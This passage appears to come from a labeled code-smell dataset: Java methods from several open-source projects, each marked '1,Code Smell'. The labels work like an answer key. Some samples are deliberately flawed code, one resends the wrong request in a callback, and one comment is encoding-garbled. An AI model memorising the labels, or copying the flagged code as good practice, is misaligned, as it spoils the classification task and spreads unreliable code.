      Optional<BlockTransactionHash> optionalReference=references.stream().filter(reference -> reference.getHash().equals(hash)).findFirst();
      if (optionalReference.isEmpty()) {
        throw new IllegalStateException(""Returned transaction "" + hash.toString() + "" that was not requested"");
      }
      BlockTransactionHash reference=optionalReference.get();
      Date blockDate=null;
      if (reference.getHeight() > 0) {
        BlockHeader blockHeader=blockHeaderMap.get(reference.getHeight());
        if (blockHeader == null) {
          transactionMap.put(hash,UNFETCHABLE_BLOCK_TRANSACTION);
          checkReferences.removeIf(ref -> ref.getHash().equals(hash));
          continue;
        }
        blockDate=blockHeader.getTimeAsDate();
      }
      BlockTransaction blockchainTransaction=new BlockTransaction(reference.getHash(),reference.getHeight(),blockDate,reference.getFee(),transaction);
      transactionMap.put(hash,blockchainTransaction);
      checkReferences.remove(reference);
    }
    if (!checkReferences.isEmpty()) {
      throw new IllegalStateException(""Could not retrieve transactions "" + checkReferences);
    }
    return transactionMap;
  }
 catch (  IllegalStateException e) {
    throw new ServerException(e.getCause());
  }
catch (  ElectrumServerRpcException e) {
    throw new ServerException(e.getMessage(),e.getCause());
  }
catch (  Exception e) {
    throw new ServerException(e);
  }
}",1,Code Smell
"private Map<String,TtmlStyle> parseHeader(XmlPullParser xmlParser,Map<String,TtmlStyle> globalStyles,CellResolution cellResolution,TtsExtent ttsExtent,Map<String,TtmlRegion> globalRegions,Map<String,String> imageMap) throws IOException, XmlPullParserException {
  do {
    xmlParser.next();
    if (XmlPullParserUtil.isStartTag(xmlParser,TtmlNode.TAG_STYLE)) {
      String parentStyleId=XmlPullParserUtil.getAttributeValue(xmlParser,ATTR_STYLE);
      TtmlStyle style=parseStyleAttributes(xmlParser,new TtmlStyle());
      if (parentStyleId != null) {
        for (        String id : parseStyleIds(parentStyleId)) {
          style.chain(globalStyles.get(id));
        }
      }
      if (style.getId() != null) {
        globalStyles.put(style.getId(),style);
      }
    }
 else     if (XmlPullParserUtil.isStartTag(xmlParser,TtmlNode.TAG_REGION)) {
      TtmlRegion ttmlRegion=parseRegionAttributes(xmlParser,cellResolution,ttsExtent);
      if (ttmlRegion != null) {
        globalRegions.put(ttmlRegion.id,ttmlRegion);
      }
    }
 else     if (XmlPullParserUtil.isStartTag(xmlParser,TtmlNode.TAG_METADATA)) {
      parseMetadata(xmlParser,imageMap);
    }
  }
 while (!XmlPullParserUtil.isEndTag(xmlParser,TtmlNode.TAG_HEAD));
  return globalStyles;
}
",1,Code Smell
"private Yaml.Sequence mergeSequence(Yaml.Sequence s1,Yaml.Sequence s2,P p,Cursor cursor){
  if (acceptTheirs) {
    return s1;
  }
  boolean isSequenceOfScalars=s2.getEntries().stream().allMatch(entry -> entry.getBlock() instanceof Yaml.Scalar);
  if (isSequenceOfScalars) {
    List<Yaml.Sequence.Entry> incomingEntries=new ArrayList<>(s2.getEntries());
    nextEntry:     for (    Yaml.Sequence.Entry entry : s1.getEntries()) {
      if (entry.getBlock() instanceof Yaml.Scalar) {
        String existingScalar=((Yaml.Scalar)entry.getBlock()).getValue();
        for (        Yaml.Sequence.Entry incomingEntry : incomingEntries) {
          if (((Yaml.Scalar)incomingEntry.getBlock()).getValue().equals(existingScalar)) {
            incomingEntries.remove(incomingEntry);
            continue nextEntry;
          }
        }
      }
    }
    return s1.withEntries(ListUtils.concatAll(s1.getEntries(),ListUtils.map(incomingEntries,incomingEntry -> autoFormat(incomingEntry,p,cursor))));
  }
 else {
    if (objectIdentifyingProperty == null) {
      return s1;
    }
 else {
      List<Yaml.Sequence.Entry> mutatedEntries=ListUtils.map(s2.getEntries(),entry -> {
        Yaml.Mapping incomingMapping=(Yaml.Mapping)entry.getBlock();
        for (        Yaml.Sequence.Entry existingEntry : s1.getEntries()) {
          Yaml.Mapping existingMapping=(Yaml.Mapping)existingEntry.getBlock();
          if (keyMatches(existingMapping,incomingMapping)) {
            return existingEntry.withBlock(mergeMapping(existingMapping,incomingMapping,p,cursor));
          }
        }
        return entry;
      }
);
      List<Yaml.Sequence.Entry> entries=ListUtils.concatAll(s1.getEntries().stream().filter(entry -> !mutatedEntries.contains(entry)).collect(Collectors.toList()),ListUtils.map(mutatedEntries,entry -> autoFormat(entry,p,cursor)));
      if (entries.size() != s1.getEntries().size()) {
        return s1.withEntries(entries);
      }
      for (int i=0; i < s1.getEntries().size(); i++) {
        if (entries.get(i) != s1.getEntries().get(i)) {
          return s1.withEntries(entries);
        }
      }
      return s1;
    }
  }
}",1,Code Smell
"@Override public boolean save(FileInfo fileInfo,UploadPretreatment pre){
  fileInfo.setBasePath(basePath);
  String newFileKey=getFileKey(fileInfo);
  fileInfo.setUrl(domain + newFileKey);
  AccessControlList fileAcl=getAcl(fileInfo.getFileAcl());
  ObjectMetadata metadata=getObjectMetadata(fileInfo);
  ProgressListener listener=pre.getProgressListener();
  ObsClient client=getClient();
  boolean useMultipartUpload=fileInfo.getSize() == null || fileInfo.getSize() >= multipartThreshold;
  String uploadId=null;
  try (InputStreamPlus in=pre.getInputStreamPlus(false)){
    if (useMultipartUpload) {
      InitiateMultipartUploadRequest initiateMultipartUploadRequest=new InitiateMultipartUploadRequest(bucketName,newFileKey);
      initiateMultipartUploadRequest.setMetadata(metadata);
      initiateMultipartUploadRequest.setAcl(fileAcl);
      uploadId=client.initiateMultipartUpload(initiateMultipartUploadRequest).getUploadId();
      List<PartEtag> partList=new ArrayList<>();
      int i=0;
      AtomicLong progressSize=new AtomicLong();
      if (listener != null)       listener.start();
      while (true) {
        byte[] bytes=IoUtil.readBytes(in,multipartPartSize);
        if (bytes == null || bytes.length == 0)         break;
        UploadPartRequest part=new UploadPartRequest();
        part.setBucketName(bucketName);
        part.setObjectKey(newFileKey);
        part.setUploadId(uploadId);
        part.setInput(new ByteArrayInputStream(bytes));
        part.setPartSize((long)bytes.length);
        part.setPartNumber(++i);
        if (listener != null) {
          part.setProgressListener(e -> listener.progress(progressSize.addAndGet(e.getNewlyTransferredBytes()),fileInfo.getSize()));
        }
        UploadPartResult uploadPartResult=client.uploadPart(part);
        partList.add(new PartEtag(uploadPartResult.getEtag(),uploadPartResult.getPartNumber()));
      }
      client.completeMultipartUpload(new CompleteMultipartUploadRequest(bucketName,newFileKey,uploadId,partList));
      if (listener != null)       listener.finish();
    }
 else {
      PutObjectRequest request=new PutObjectRequest(bucketName,newFileKey,in);
      request.setMetadata(metadata);
      request.setAcl(fileAcl);
      if (listener != null) {
        listener.start();
        request.setProgressListener(e -> listener.progress(e.getTransferredBytes(),fileInfo.getSize()));
      }
      client.putObject(request);
      if (listener != null)       listener.finish();
    }
    if (fileInfo.getSize() == null)     fileInfo.setSize(in.getProgressSize());
    byte[] thumbnailBytes=pre.getThumbnailBytes();
    if (thumbnailBytes != null) {
      String newThFileKey=getThFileKey(fileInfo);
      fileInfo.setThUrl(domain + newThFileKey);
      PutObjectRequest request=new PutObjectRequest(bucketName,newThFileKey,new ByteArrayInputStream(thumbnailBytes));
      request.setMetadata(getThObjectMetadata(fileInfo));
      request.setAcl(getAcl(fileInfo.getThFileAcl()));
      client.putObject(request);
    }
    return true;
  }
 catch (  Exception e) {
    try {
      if (useMultipartUpload) {
        client.abortMultipartUpload(new AbortMultipartUploadRequest(bucketName,newFileKey,uploadId));
      }
 else {
        client.deleteObject(bucketName,newFileKey);
      }
    }
 catch (    Exception ignored) {
    }
    throw ExceptionFactory.upload(fileInfo,platform,e);
  }
}",1,Code Smell
"public void updateFilter(PhotoFilterView filterView,Runnable whenDone){
  clearFilter();
  filterState=filterView.getSavedFilterState();
  if (!isVideo) {
    if (filterState.isEmpty()) {
      if (whenDone != null) {
        whenDone.run();
      }
      return;
    }
    Bitmap bitmap=filterView.getBitmap();
    if (bitmap == null) {
      if (whenDone != null) {
        whenDone.run();
      }
      return;
    }
    final Matrix matrix=new Matrix();
    matrix.postScale(invert == 1 ? -1.0f : 1.0f,invert == 2 ? -1.0f : 1.0f,width / 2f,height / 2f);
    matrix.postRotate(-orientation);
    final Bitmap rotatedBitmap=Bitmap.createBitmap(bitmap,0,0,bitmap.getWidth(),bitmap.getHeight(),matrix,true);
    this.matrix.preScale((float)width / rotatedBitmap.getWidth(),(float)height / rotatedBitmap.getHeight());
    width=rotatedBitmap.getWidth();
    height=rotatedBitmap.getHeight();
    bitmap.recycle();
    if (filterFile != null && filterFile.exists()) {
      filterFile.delete();
    }
    String ext=ext(file);
    final boolean supportTransparent=""png"".equals(ext) || ""webp"".equals(ext);
    filterFile=makeCacheFile(currentAccount,supportTransparent ? ""webp"" : ""jpg"");
    if (whenDone == null) {
      try {
        FileOutputStream stream=new FileOutputStream(filterFile);
        rotatedBitmap.compress(supportTransparent ? Bitmap.CompressFormat.WEBP : Bitmap.CompressFormat.JPEG,90,stream);
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
      rotatedBitmap.recycle();
    }
 else {
      Utilities.themeQueue.postRunnable(() -> {
        try {
          FileOutputStream stream=new FileOutputStream(filterFile);
          rotatedBitmap.compress(supportTransparent ? Bitmap.CompressFormat.WEBP : Bitmap.CompressFormat.JPEG,90,stream);
        }
 catch (        Exception e) {
          FileLog.e(e,false);
          if (supportTransparent) {
            try {
              FileOutputStream stream=new FileOutputStream(filterFile);
              rotatedBitmap.compress(Bitmap.CompressFormat.PNG,90,stream);
            }
 catch (            Exception e2) {
              FileLog.e(e2,false);
            }
          }
        }
        rotatedBitmap.recycle();
        AndroidUtilities.runOnUIThread(whenDone);
      }
);
    }
  }
 else {
    if (whenDone != null) {
      whenDone.run();
    }
  }
}",1,Code Smell
"protected void visitStatement(@Nullable JRightPadded<Statement> paddedStat,JRightPadded.Location location,PrintOutputCapture<P> p){
  if (paddedStat == null) {
    return;
  }
  visit(paddedStat.getElement(),p);
  visitSpace(paddedStat.getAfter(),location.getAfterLocation(),p);
  Statement s=paddedStat.getElement();
  while (true) {
    if (s instanceof Assert || s instanceof Assignment || s instanceof AssignmentOperation|| s instanceof Break|| s instanceof Continue|| s instanceof DoWhileLoop|| s instanceof Empty|| s instanceof MethodInvocation|| s instanceof NewClass|| s instanceof Return|| s instanceof Throw|| s instanceof Unary|| s instanceof VariableDeclarations|| s instanceof Yield) {
      p.append(';');
      return;
    }
    if (s instanceof MethodDeclaration && ((MethodDeclaration)s).getBody() == null) {
      p.append(';');
      return;
    }
    if (s instanceof Label) {
      s=((Label)s).getStatement();
      continue;
    }
    if (getCursor().getValue() instanceof Case) {
      Object aSwitch=getCursor().dropParentUntil(c -> c instanceof Switch || c instanceof SwitchExpression || c == Cursor.ROOT_VALUE).getValue();
      if (aSwitch instanceof J.SwitchExpression) {
        Case aCase=getCursor().getValue();
        if (!(aCase.getBody() instanceof J.Block)) {
          p.append(';');
        }
        return;
      }
    }
    return;
  }
}
",1,Code Smell
"private void getNewVersionMessagesCallback(Delegate delegate,ArrayList<EmojiPackInfo> packs,TLObject response){
  if (response != null) {
    var res=(TLRPC.messages_Messages)response;
    getMessagesController().removeDeletedMessagesFromArray(CHANNEL_METADATA_ID,res.messages);
    var documents=new HashMap<Integer,TLRPC.Document>();
    for (    var message : res.messages) {
      if (message.media == null || message.media.document == null) {
        continue;
      }
      documents.put(message.id,message.media.document);
    }
    SerializedData serializedData=new SerializedData();
    serializedData.writeInt32(packs.size());
    for (    EmojiPackInfo pack : packs) {
      TLRPC.Document file=documents.get(pack.fileId);
      if (file != null) {
        pack.flags|=1;
        pack.fileDocument=file;
        pack.fileSize=file.size;
        pack.fileLocation=getFileLoader().getPathToAttach(file).getAbsolutePath();
      }
      TLRPC.Document preview=documents.get(pack.previewId);
      if (preview != null) {
        pack.flags|=2;
        pack.previewDocument=preview;
      }
      pack.serializeToStream(serializedData);
    }
    preferences.edit().putString(""emoji_packs_v2"",Base64.encodeToString(serializedData.toByteArray(),Base64.NO_WRAP | Base64.NO_PADDING)).apply();
    serializedData.cleanup();
    AndroidUtilities.runOnUIThread(() -> {
      var iterator=emojiPacksInfo.listIterator();
      while (iterator.hasNext()) {
        if (iterator.next() instanceof EmojiPackInfo) {
          iterator.remove();
        }
      }
      emojiPacksInfo.addAll(packs);
    }
);
  }
  delegate.onTLResponse(null,null);
}",1,Code Smell
"public KeyRelationEntry parse(AnnotationExpr keyRelation){
  KeyRelationEntry entry=new KeyRelationEntry();
  entry.setJavadoc(JavaParserUtil.javadocFirstLineOf(leftClassDeclaration));
  entry.setLeftClass(leftClassDeclaration.getNameAsString());
  entry.setLeftClassPackageName(JavaParserUtil.packageName(leftClassDeclaration));
  NormalAnnotationExpr normalAnnotationExpr=(NormalAnnotationExpr)keyRelation;
  for (  MemberValuePair memberValuePair : normalAnnotationExpr.getPairs()) {
switch (memberValuePair.getNameAsString()) {
case ""type"":
      entry.setTypeInString(AnnotationFieldParser.singleFieldValue(memberValuePair));
    break;
case ""remark"":
  entry.setRemark(AnnotationFieldParser.singleFieldValue(memberValuePair));
break;
case ""contextual"":
entry.setContextual(true);
break;
case ""whom"":
ClassExpr classExpr=(ClassExpr)memberValuePair.getValue();
String rightClazz=classExpr.getTypeAsString();
if (rightClazz.contains(""."")) {
rightClazz=rightClazz.substring(rightClazz.lastIndexOf('.') + 1);
}
entry.setRightClass(rightClazz);
entry.setRightClassPackageName(JavaParserUtil.packageOfKeyRelationRightClass(keyRelation,classExpr));
if (entry.getRightClassPackageName().isEmpty()) {
entry.setRightClassPackageName(entry.getLeftClassPackageName());
}
break;
}
}
return entry;
}",1,Code Smell
"public Bulletin createUsersBulletin(List<? extends TLObject> users,CharSequence text){
  return createUsersBulletin(users,text,null,null);
}
public Bulletin createUsersBulletin(List<? extends TLObject> users,CharSequence text,CharSequence subtitle,UndoObject undoObject){
  final Bulletin.UsersLayout layout=new Bulletin.UsersLayout(getContext(),subtitle != null,resourcesProvider);
  int count=0;
  if (users != null) {
    for (int i=0; i < users.size(); ++i) {
      if (count >= 3)       break;
      TLObject user=users.get(i);
      if (user != null) {
        layout.avatarsImageView.setCount(++count);
        layout.avatarsImageView.setObject(count - 1,UserConfig.selectedAccount,user);
      }
    }
    if (users.size() == 1) {
      layout.avatarsImageView.setTranslationX(AndroidUtilities.dp(4));
      layout.avatarsImageView.setScaleX(1.2f);
      layout.avatarsImageView.setScaleY(1.2f);
    }
 else {
      layout.avatarsImageView.setScaleX(1f);
      layout.avatarsImageView.setScaleY(1f);
    }
  }
  layout.avatarsImageView.commitTransition(false);
  if (subtitle != null) {
    layout.textView.setSingleLine(true);
    layout.textView.setMaxLines(1);
    layout.textView.setText(text);
    layout.subtitleView.setText(subtitle);
    layout.subtitleView.setSingleLine(true);
    layout.subtitleView.setMaxLines(1);
    if (layout.linearLayout.getLayoutParams() instanceof ViewGroup.MarginLayoutParams) {
      int margin=AndroidUtilities.dp(12 + 56 + 2 - (3 - count) * 12);
      if (count == 1) {
        margin+=AndroidUtilities.dp(4);
      }
      if (LocaleController.isRTL) {
        ((ViewGroup.MarginLayoutParams)layout.linearLayout.getLayoutParams()).rightMargin=margin;
      }
 else {
        ((ViewGroup.MarginLayoutParams)layout.linearLayout.getLayoutParams()).leftMargin=margin;
      }
    }
  }
 else {
    layout.textView.setSingleLine(false);
    layout.textView.setMaxLines(2);
    layout.textView.setText(text);
    if (layout.textView.getLayoutParams() instanceof ViewGroup.MarginLayoutParams) {
      int margin=AndroidUtilities.dp(12 + 56 + 2 - (3 - count) * 12);
      if (count == 1) {
        layout.textView.setTranslationY(-AndroidUtilities.dp(1));
        margin+=AndroidUtilities.dp(4);
      }
      if (LocaleController.isRTL) {
        ((ViewGroup.MarginLayoutParams)layout.textView.getLayoutParams()).rightMargin=margin;
      }
 else {
        ((ViewGroup.MarginLayoutParams)layout.textView.getLayoutParams()).leftMargin=margin;
      }
    }
  }
  if (undoObject != null) {
    layout.setButton(new Bulletin.UndoButton(getContext(),true,resourcesProvider).setText(LocaleController.getString(""Undo"",R.string.Undo)).setUndoAction(undoObject.onUndo).setDelayedAction(undoObject.onAction));
  }
  return create(layout,Bulletin.DURATION_PROLONG);
}",1,Code Smell
"public static void getDeviceTotalSize(Utilities.Callback2<Long,Long> onDone){
  if (lastDeviceTotalSize != null && lastDeviceTotalFreeSize != null) {
    if (onDone != null) {
      onDone.run(lastDeviceTotalSize,lastDeviceTotalFreeSize);
    }
    return;
  }
  Utilities.cacheClearQueue.postRunnable(() -> {
    File path;
    if (Build.VERSION.SDK_INT >= 19) {
      ArrayList<File> storageDirs=AndroidUtilities.getRootDirs();
      String dir=(path=storageDirs.get(0)).getAbsolutePath();
      if (!TextUtils.isEmpty(SharedConfig.storageCacheDir)) {
        for (int a=0, N=storageDirs.size(); a < N; a++) {
          File file=storageDirs.get(a);
          if (file.getAbsolutePath().startsWith(SharedConfig.storageCacheDir) && file.canWrite()) {
            path=file;
            break;
          }
        }
      }
    }
 else {
      path=new File(SharedConfig.storageCacheDir);
    }
    try {
      StatFs stat=new StatFs(path.getPath());
      long blockSize;
      long blockSizeExternal;
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
        blockSize=stat.getBlockSizeLong();
      }
 else {
        blockSize=stat.getBlockSize();
      }
      long availableBlocks;
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
        availableBlocks=stat.getAvailableBlocksLong();
      }
 else {
        availableBlocks=stat.getAvailableBlocks();
      }
      long blocksTotal;
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
        blocksTotal=stat.getBlockCountLong();
      }
 else {
        blocksTotal=stat.getBlockCount();
      }
      AndroidUtilities.runOnUIThread(() -> {
        lastDeviceTotalSize=blocksTotal * blockSize;
        lastDeviceTotalFreeSize=availableBlocks * blockSize;
        if (onDone != null) {
          onDone.run(lastDeviceTotalSize,lastDeviceTotalFreeSize);
        }
      }
);
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
  }
);
}",1,Code Smell
"@Override public void run() throws Exception {
  GlobalState.config=new Config();
  if (isRunningHeadless()) {
    String allArgString=StringUtils.join(getScriptArgs()).strip();
    GlobalState.config=HeadlessParser.parseConfig(allArgString);
  }
 else {
    GlobalState.ghidraScript=this;
    GlobalState.config=new Config();
    GlobalState.config.setGUI(true);
    ConfigDialog dialog=new ConfigDialog(GlobalState.config);
    dialog.showDialog();
    if (!dialog.isSuccess()) {
      return;
    }
  }
  if (!Logging.init()) {
    return;
  }
  FunctionModelManager.initAll();
  if (GlobalState.config.isEnableZ3() && !Utils.checkZ3Installation()) {
    return;
  }
  Logging.info(""Preparing the program"");
  if (!prepareProgram()) {
    Logging.error(""Failed to prepare the program"");
    return;
  }
  if (isRunningHeadless()) {
    if (!Utils.registerExternalFunctionsConfig(GlobalState.currentProgram,GlobalState.config)) {
      return;
    }
  }
 else {
    Utils.loadCustomExternalFunctionFromLabelHistory(GlobalState.currentProgram);
  }
  GlobalState.arch=new Architecture(GlobalState.currentProgram);
  boolean success=analyze();
  if (!success) {
    Logging.error(""Failed to analyze the program: no entrypoint."");
    return;
  }
  Logging.info(""Running checkers"");
  CheckerManager.runCheckers(GlobalState.config);
  guiProcessResult();
  GlobalState.reset();
}",1,Code Smell
"public void pan(float tx,float ty){
  position.x+=tx;
  position.y+=ty;
  View parent=(View)getParent();
  if (parent != null) {
    int newStickyX=STICKY_NONE;
    if (!lastIsMultitouch) {
      if (Math.abs(position.x - parent.getMeasuredWidth() / 2f) <= dp(STICKY_TRIGGER_DP) && position.y < parent.getMeasuredHeight() - dp(112)) {
        newStickyX=STICKY_CENTER;
      }
 else       if (Math.abs(position.x - (width() / 2f + getStickyPaddingLeft()) * getScaleX() - dp(STICKY_PADDING_X_DP)) <= dp(STICKY_TRIGGER_DP)) {
        newStickyX=STICKY_START;
      }
 else       if (Math.abs(position.x + (width() / 2f - getStickyPaddingRight()) * getScaleX() - (parent.getMeasuredWidth() - dp(STICKY_PADDING_X_DP))) <= dp(STICKY_TRIGGER_DP)) {
        newStickyX=STICKY_END;
      }
    }
    if (stickyXRunnableValue != newStickyX) {
      if ((stickyXRunnableValue=newStickyX) == STICKY_NONE) {
        updateStickyX();
      }
 else {
        AndroidUtilities.runOnUIThread(setStickyXRunnable,STICKY_DURATION);
      }
    }
    int newStickyY=STICKY_NONE;
    if (!lastIsMultitouch) {
      if (Math.abs(position.y - parent.getMeasuredHeight() / 2f) <= dp(STICKY_TRIGGER_DP)) {
        newStickyY=STICKY_CENTER;
      }
 else       if (Math.abs(position.y - (height() / 2f + getStickyPaddingTop()) * getScaleY() - dp(STICKY_PADDING_Y_DP)) <= dp(STICKY_TRIGGER_DP)) {
        newStickyY=STICKY_START;
      }
 else       if (Math.abs(position.y + (height() / 2f - getStickyPaddingBottom()) * getScaleY() - (parent.getMeasuredHeight() - dp(STICKY_PADDING_Y_DP))) <= dp(STICKY_TRIGGER_DP)) {
        newStickyY=STICKY_END;
      }
    }
    if (stickyYRunnableValue != newStickyY) {
      if ((stickyYRunnableValue=newStickyY) == STICKY_NONE) {
        updateStickyY();
      }
 else {
        AndroidUtilities.runOnUIThread(setStickyYRunnable,STICKY_DURATION);
      }
    }
  }
  updatePosition();
}",1,Code Smell
"public void sendQuickReplyTo(long dialogId,QuickRepliesController.QuickReply reply){
  if (reply == null)   return;
  TLRPC.TL_messages_sendQuickReplyMessages req=new TLRPC.TL_messages_sendQuickReplyMessages();
  req.peer=MessagesController.getInstance(currentAccount).getInputPeer(dialogId);
  if (req.peer == null)   return;
  req.shortcut_id=reply.id;
  MessagesStorage storage=MessagesStorage.getInstance(currentAccount);
  storage.getStorageQueue().postRunnable(() -> {
    ArrayList<Integer> ids=new ArrayList<>();
    SQLiteCursor cursor=null;
    try {
      cursor=storage.getDatabase().queryFinalized(""SELECT id FROM quick_replies_messages WHERE topic_id = ?"",reply.id);
      while (cursor.next()) {
        ids.add(cursor.intValue(0));
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
 finally {
      if (cursor != null) {
        cursor.dispose();
      }
    }
    AndroidUtilities.runOnUIThread(() -> {
      if (ids.isEmpty() || ids.size() < reply.getMessagesCount()) {
        TLRPC.TL_messages_getQuickReplyMessages req2=new TLRPC.TL_messages_getQuickReplyMessages();
        req2.shortcut_id=reply.id;
        ConnectionsManager.getInstance(currentAccount).sendRequest(req2,(res,err) -> AndroidUtilities.runOnUIThread(() -> {
          if (res instanceof TLRPC.TL_messages_messages) {
            ArrayList<TLRPC.Message> messages=((TLRPC.TL_messages_messages)res).messages;
            ids.clear();
            for (            TLRPC.Message m : messages) {
              ids.add(m.id);
            }
            req.id=ids;
            for (int i=0; i < ids.size(); ++i) {
              req.random_id.add(Utilities.random.nextLong());
            }
            ConnectionsManager.getInstance(currentAccount).sendRequest(req2,null);
          }
 else {
            FileLog.e(""received "" + res + "" ""+ err+ "" on getQuickReplyMessages when trying to send quick reply"");
          }
        }
));
      }
 else {
        req.id=ids;
        for (int i=0; i < ids.size(); ++i) {
          req.random_id.add(Utilities.random.nextLong());
        }
        ConnectionsManager.getInstance(currentAccount).sendRequest(req,null);
      }
    }
);
  }
);
}",1,Code Smell
"private void runDelayed(){
  if (viewToAdd.isEmpty() && viewToRemove.isEmpty()) {
    return;
  }
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
    ViewParent parent=getParent();
    if (parent != null) {
      TransitionManager.beginDelayedTransition(this,transitionSet);
    }
  }
  for (int i=0; i < viewToAdd.size(); i++) {
    NotificationView view=viewToAdd.get(i);
    for (int j=0; j < viewToRemove.size(); j++) {
      if (view.tag.equals(viewToRemove.get(j).tag)) {
        viewToAdd.remove(i);
        viewToRemove.remove(j);
        i--;
        break;
      }
    }
  }
  for (int i=0; i < viewToAdd.size(); i++) {
    addView(viewToAdd.get(i),LayoutHelper.createLinear(LayoutHelper.WRAP_CONTENT,LayoutHelper.WRAP_CONTENT,Gravity.CENTER_HORIZONTAL,4,0,0,4));
  }
  for (int i=0; i < viewToRemove.size(); i++) {
    removeView(viewToRemove.get(i));
  }
  viewsByTag.clear();
  for (int i=0; i < getChildCount(); i++) {
    NotificationView v=(NotificationView)getChildAt(i);
    viewsByTag.put(v.tag,v);
  }
  viewToAdd.clear();
  viewToRemove.clear();
  lock();
  if (onViewsUpdated != null) {
    onViewsUpdated.run();
  }
}",1,Code Smell
"/** 
 * 鑾峰彇鏂囦欢鍚�
 */
public static String getFileName(String template,String className,String packageName,String moduleName){
  String packagePath=""main"" + File.separator + ""java""+ File.separator;
  if (StringUtils.isNotBlank(packageName)) {
    packagePath+=packageName.replace(""."",File.separator) + File.separator + moduleName+ File.separator;
  }
  if (template.contains(""MongoChildrenEntity.java.vm"")) {
    return packagePath + ""entity"" + File.separator+ ""inner""+ File.separator+ currentTableName+ File.separator+ splitInnerName(className)+ ""InnerEntity.java"";
  }
  if (template.contains(""Entity.java.vm"") || template.contains(""MongoEntity.java.vm"")) {
    return packagePath + ""entity"" + File.separator+ className+ ""Entity.java"";
  }
  if (template.contains(""Dao.java.vm"")) {
    return packagePath + ""dao"" + File.separator+ className+ ""Dao.java"";
  }
  if (template.contains(""Service.java.vm"")) {
    return packagePath + ""service"" + File.separator+ className+ ""Service.java"";
  }
  if (template.contains(""ServiceImpl.java.vm"")) {
    return packagePath + ""service"" + File.separator+ ""impl""+ File.separator+ className+ ""ServiceImpl.java"";
  }
  if (template.contains(""Controller.java.vm"")) {
    return packagePath + ""controller"" + File.separator+ className+ ""Controller.java"";
  }
  if (template.contains(""Dao.xml.vm"")) {
    return ""main"" + File.separator + ""resources""+ File.separator+ ""mapper""+ File.separator+ moduleName+ File.separator+ className+ ""Dao.xml"";
  }
  if (template.contains(""menu.sql.vm"")) {
    return className.toLowerCase() + ""_menu.sql"";
  }
  if (template.contains(""index.vue.vm"")) {
    return ""main"" + File.separator + ""resources""+ File.separator+ ""src""+ File.separator+ ""views""+ File.separator+ ""modules""+ File.separator+ moduleName+ File.separator+ className.toLowerCase()+ "".vue"";
  }
  if (template.contains(""add-or-update.vue.vm"")) {
    return ""main"" + File.separator + ""resources""+ File.separator+ ""src""+ File.separator+ ""views""+ File.separator+ ""modules""+ File.separator+ moduleName+ File.separator+ className.toLowerCase()+ ""-add-or-update.vue"";
  }
  return null;
}
",1,Code Smell
"public static Map<String,Object> transChartData(List<ChartViewFieldDTO> xAxis,List<ChartViewFieldDTO> yAxis,ChartViewDTO view,List<String[]> data,boolean isDrill){
  Map<String,Object> map=new HashMap<>();
  List<String> x=new ArrayList<>();
  List<Series> series=new ArrayList<>();
  for (  ChartViewFieldDTO y : yAxis) {
    Series series1=new Series();
    series1.setName(y.getName());
    series1.setType(view.getType());
    series1.setData(new ArrayList<>());
    series.add(series1);
  }
  for (int i1=0; i1 < data.size(); i1++) {
    String[] d=data.get(i1);
    StringBuilder a=new StringBuilder();
    for (int i=xAxis.size(); i < xAxis.size() + yAxis.size(); i++) {
      List<ChartDimensionDTO> dimensionList=new ArrayList<>();
      List<ChartQuotaDTO> quotaList=new ArrayList<>();
      AxisChartDataDTO axisChartDataDTO=new AxisChartDataDTO();
      for (int j=0; j < xAxis.size(); j++) {
        ChartDimensionDTO chartDimensionDTO=new ChartDimensionDTO();
        chartDimensionDTO.setId(xAxis.get(j).getId());
        chartDimensionDTO.setValue(d[j]);
        dimensionList.add(chartDimensionDTO);
      }
      axisChartDataDTO.setDimensionList(dimensionList);
      int j=i - xAxis.size();
      ChartQuotaDTO chartQuotaDTO=new ChartQuotaDTO();
      chartQuotaDTO.setId(yAxis.get(j).getId());
      quotaList.add(chartQuotaDTO);
      axisChartDataDTO.setQuotaList(quotaList);
      try {
        axisChartDataDTO.setValue(StringUtils.isEmpty(d[i]) ? null : new BigDecimal(d[i]));
      }
 catch (      Exception e) {
        axisChartDataDTO.setValue(new BigDecimal(0));
      }
      series.get(j).getData().add(axisChartDataDTO);
    }
    if (isDrill) {
      a.append(d[xAxis.size() - 1]);
    }
 else {
      for (int i=0; i < xAxis.size(); i++) {
        if (i == xAxis.size() - 1) {
          a.append(d[i]);
        }
 else {
          a.append(d[i]).append(""\n"");
        }
      }
    }
    x.add(a.toString());
  }
  map.put(""x"",x);
  map.put(""series"",series);
  return map;
}",1,Code Smell
"private void putMediaDatabase(long uid,long topicId,int type,ArrayList<TLRPC.Message> messages,int max_id,int min_id,boolean topReached){
  getMessagesStorage().getStorageQueue().postRunnable(() -> {
    try {
      if (min_id == 0 && (messages.isEmpty() || topReached)) {
        getMessagesStorage().doneHolesInMedia(uid,max_id,type,topicId);
        if (messages.isEmpty()) {
          return;
        }
      }
      getMessagesStorage().getDatabase().beginTransaction();
      SQLitePreparedStatement state2;
      if (topicId != 0) {
        state2=getMessagesStorage().getDatabase().executeFast(""REPLACE INTO media_topics VALUES(?, ?, ?, ?, ?, ?)"");
      }
 else {
        state2=getMessagesStorage().getDatabase().executeFast(""REPLACE INTO media_v4 VALUES(?, ?, ?, ?, ?)"");
      }
      for (      TLRPC.Message message : messages) {
        if (canAddMessageToMedia(message)) {
          state2.requery();
          MessageObject.normalizeFlags(message);
          NativeByteBuffer data=new NativeByteBuffer(message.getObjectSize());
          message.serializeToStream(data);
          int pointer=1;
          state2.bindInteger(pointer++,message.id);
          state2.bindLong(pointer++,uid);
          if (topicId != 0) {
            state2.bindLong(pointer++,topicId);
          }
          state2.bindInteger(pointer++,message.date);
          state2.bindInteger(pointer++,type);
          state2.bindByteBuffer(pointer++,data);
          state2.step();
          data.reuse();
        }
      }
      state2.dispose();
      if (!topReached || max_id != 0 || min_id != 0) {
        int minId=(topReached && min_id == 0) ? 1 : messages.get(messages.size() - 1).id;
        if (min_id != 0) {
          getMessagesStorage().closeHolesInMedia(uid,minId,messages.get(0).id,type,topicId);
        }
 else         if (max_id != 0) {
